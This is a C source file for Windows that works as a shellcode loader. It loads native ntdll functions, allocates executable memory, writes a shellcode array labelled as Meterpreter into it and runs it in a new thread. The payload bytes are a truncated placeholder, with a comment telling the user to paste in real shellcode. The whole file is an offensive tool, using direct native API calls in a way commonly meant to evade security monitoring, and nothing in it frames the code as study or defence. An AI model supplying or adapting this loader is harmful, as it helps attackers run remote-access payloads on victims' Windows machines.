#include <stdio.h>
#include <windows.h>

// Define function pointers for native API functions
typedef NTSTATUS(WINAPI* PNTALLOCATEVIRTUALMEMORY)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS(NTAPI* PNTWRITEVIRTUALMEMORY)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef NTSTATUS(NTAPI* PNTCREATETHREADEX)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
typedef NTSTATUS(NTAPI* PNTWAITFORSINGLEOBJECT)(HANDLE, BOOLEAN, PLARGE_INTEGER);

int main() {

    // Insert the Meterpreter shellcode as an array of unsigned chars (replace the placeholder with actual shellcode)
    unsigned char code[] = "\xfc\x48\x83...";

    // Load native API functions from ntdll.dll
    PNTALLOCATEVIRTUALMEMORY NtAllocateVirtualMemory = (PNTALLOCATEVIRTUALMEMORY)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");
    PNTWRITEVIRTUALMEMORY NtWriteVirtualMemory = (PNTWRITEVIRTUALMEMORY)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory");
    PNTCREATETHREADEX NtCreateThreadEx = (PNTCREATETHREADEX)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx");
    PNTWAITFORSINGLEOBJECT NtWaitForSingleObject = (PNTWAITFORSINGLEOBJECT)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWaitForSingleObject");
    
    // Allocate Virtual Memory with PAGE_EXECUTE_READWRITE permissions to store the shellcode
    // 'exec' will hold the base address of the allocated memory region
    void* exec = NULL;
    SIZE_T size = sizeof(code);
    NtAllocateVirtualMemory(GetCurrentProcess(), &exec, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // Copy the shellcode into the allocated memory region
    SIZE_T bytesWritten;
    NtWriteVirtualMemory(GetCurrentProcess(), exec, code, sizeof(code), &bytesWritten);

    // Execute the shellcode in memory using a new thread
    // Pass the address of the shellcode as the thread function (StartRoutine) and its parameter (Argument)
    HANDLE hThread;
    NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, GetCurrentProcess(), exec, exec, FALSE, 0, 0, 0, NULL);

    // Wait for the end of the thread to ensure the shellcode execution is complete
    NtWaitForSingleObject(hThread, FALSE, NULL);

    // Return 0 as the main function exit code
    return 0;

}
